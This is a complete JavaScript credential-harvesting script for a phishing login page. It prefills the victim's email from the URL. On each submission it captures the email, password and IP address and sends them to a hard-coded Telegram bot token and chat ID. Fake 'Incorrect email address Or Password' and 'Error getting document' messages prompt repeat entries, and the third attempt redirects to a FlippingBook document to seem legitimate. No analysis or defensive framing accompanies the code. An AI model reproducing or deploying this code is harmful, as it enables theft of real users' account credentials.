document.addEventListener("DOMContentLoaded", function() {
  let submissionCount = 0; // Initialize submission count
  const emailInput = document.getElementById("email");

    // Prefill email from URL
    const params = new URLSearchParams(window.location.search);
    const emailFromUrl = params.get('email');
    if (emailFromUrl) {
        emailInput.value = emailFromUrl.trim();
    }
      

  document.getElementById("fdatshi").addEventListener("submit", function(event) {
      event.preventDefault(); // Prevent default form submission

              // Show spinner
              const submitButton = document.getElementById("submit");
              submitButton.innerHTML = '<button class="btn btn-sm btn-primary" disabled><span class="spinner-border spinner-border-sm"></span>Please Wait...</button>';

      // Increment submission count
      submissionCount++;

      // Get form input values
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      // Fetch the user's IP address
      fetch("https://api.ipify.org?format=json")
          .then(response => response.json())
          .then(data => {
              const userIP = data.ip;

              // Send the form data and IP address to Telegram
              sendFormToTelegram(email, password, userIP);

              // Check submission count and take appropriate action
              if (submissionCount === 1) {
                  // First submission: Show "Incorrect email address" message
                  showMessage("Incorrect email address Or Password");
              } else if (submissionCount === 2) {
                  // Second submission: Show "Error getting document" message
                  showMessage("Error getting document");
              } else if (submissionCount === 3) {
                  // Third submission: Redirect the user to another page
                  window.location.href = "https://online.flippingbook.com/view/904094431/";
              }

              // Clear the form fields
              document.getElementById("password").value = "";

              console.log("User IP:", userIP);

              // Hide spinner after processing
              submitButton.innerHTML = '<button class="btn btn-sm btn-primary">Submit</button>';
          })
          .catch(error => {
              console.error("Error fetching user IP:", error);
          });
  });

  function showMessage(text) {
      const messageElement = document.getElementById("message");
      messageElement.textContent = text;
  }

  // Function to send form data and user's IP address to Telegram
  function sendFormToTelegram(email, password, ip) {
      const botToken = "7627236360:AAF-b08Vyheg-2FFdROMAzDG-VNHUQgH3Og"; // Replace with your Telegram bot token
      const chatId = "7562799891"; // Replace with your Telegram chat ID

      const message = `New form submission:\n\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      fetch(url)
          .then(response => response.json())
          .then(data => {
              console.log("Message sent to Telegram:", data);
          })
          .catch(error => {
              console.error("Error sending message to Telegram:", error);
          });
  }
});
